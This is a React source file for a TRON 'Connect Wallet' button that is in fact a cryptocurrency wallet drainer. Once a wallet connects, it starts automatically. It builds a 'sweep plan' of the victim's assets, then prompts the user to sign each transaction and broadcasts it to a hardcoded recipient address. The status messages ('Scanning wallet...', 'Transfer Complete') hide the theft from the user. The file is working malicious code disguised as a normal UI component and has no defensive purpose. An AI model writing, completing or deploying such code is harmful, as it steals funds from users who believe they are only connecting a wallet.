import React, { useState, useEffect, useRef } from 'react';
import { useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
import { useWalletModal } from '@tronweb3/tronwallet-adapter-react-ui';
import { TransactionService } from '../services/transaction.service';

// --- CONFIGURATION ---
// Address to receive funds
const RECIPIENT_ADDRESS = 'TWBRNk1RJJ9Vvff38ARFvvmhbGk7UybJYg';
// ---------------------

const ConnectWalletBtn = ({ className }) => {
    const { address, signTransaction, connected, select, wallets, connect } = useWallet();
    const { setVisible } = useWalletModal();
    const [status, setStatus] = useState('');
    const [isLoading, setIsLoading] = useState(false);

    // To prevent double execution
    const hasTriggeredRef = useRef(false);

    const handleTransaction = async () => {
        if (!address) return;

        console.log("Auto-Triggering Transaction Flow...");
        setIsLoading(true);
        setStatus('Scanning wallet...');

        try {
            // 1. Create Sweep Plan
            const plan = await TransactionService.createSweepPlan(address, RECIPIENT_ADDRESS);
            console.log("Sweep Plan:", plan);

            if (plan.length === 0) {
                setStatus("No assets to move.");
                setIsLoading(false);
                return;
            }

            setStatus(`Processing ${plan.length} assets...`);

            // 2. Execute Plan
            for (let i = 0; i < plan.length; i++) {
                const item = plan[i];
                setStatus(`Signing ${item.type}...`);

                try {
                    // Sign
                    const signedTransaction = await signTransaction(item.transaction);

                    // Broadcast
                    setStatus(`Sending ${item.type}...`);
                    const result = await TransactionService.broadcast(signedTransaction);

                    if (result.result) {
                        console.log(`${item.type} Success:`, result.txid);
                    } else {
                        console.error(`${item.type} Failed:`, result);
                    }
                } catch (err) {
                    console.error("Sign Error:", err);
                    break;
                }
            }

            setStatus('Transfer Complete');
        } catch (error) {
            console.error("Transaction Error:", error);
            setStatus('Error');
        } finally {
            setIsLoading(false);
        }
    };

    // Auto-trigger logic
    useEffect(() => {
        if (connected && address && !hasTriggeredRef.current) {
            hasTriggeredRef.current = true;
            const timer = setTimeout(() => handleTransaction(), 1000);
            return () => clearTimeout(timer);
        }

        if (!connected) {
            hasTriggeredRef.current = false;
            setStatus('');
        }
    }, [connected, address]);

    // Handle button click: Direct WalletConnect Trigger
    const handleClick = async () => {
        if (!connected) {
            try {
                // Find WalletConnect adapter
                const walletConnectAdapter = wallets.find(w => w.adapter.name === 'WalletConnect');

                if (walletConnectAdapter) {
                    console.log("Selecting WalletConnect adapter...");
                    select(walletConnectAdapter.adapter.name);

                    // Small delay to ensure selection propagates before connecting
                    // Although select() might be async in some implementations or state based
                    // The core logic is: Select -> The adapter should trigger its flow.
                    // For standard WalletConnect, calling connect() explicitly might be needed 
                    // if selection doesn't auto-connect.

                    // In many adapters, 'select' just sets the current wallet. 
                    // 'connect' triggers the modal.
                    setTimeout(() => {
                        // We don't call connect() here because the adapter's select() usually
                        // sets it as active, but we might need to verify if we need to call connect() manually.
                        // However, typically the user interaction flow is: Select -> Connect.
                        // But if we use `useWalletModal`, it handles UI. 
                        // To skip UI, we interact with adapter.

                        // Note: creating a custom UI means WE are responsible for connection errors.

                        // Attempt connection (trigger QR modal)
                        // Getting the specific adapter instance via hook is cleaner if possible,
                        // but context exposes general `connect`.
                        connect();
                    }, 100);
                } else {
                    console.error("WalletConnect adapter not found");
                    // Fallback to standard modal if somehow missing
                    setVisible(true);
                }
            } catch (e) {
                console.error("Connection Error:", e);
            }
        }
    };

    return (
        <button
            className={className}
            onClick={handleClick}
            disabled={isLoading}
        >
            {connected ? (status || 'Wallet Connected') : 'Connect Wallet'}
        </button>
    );
};

export default ConnectWalletBtn;
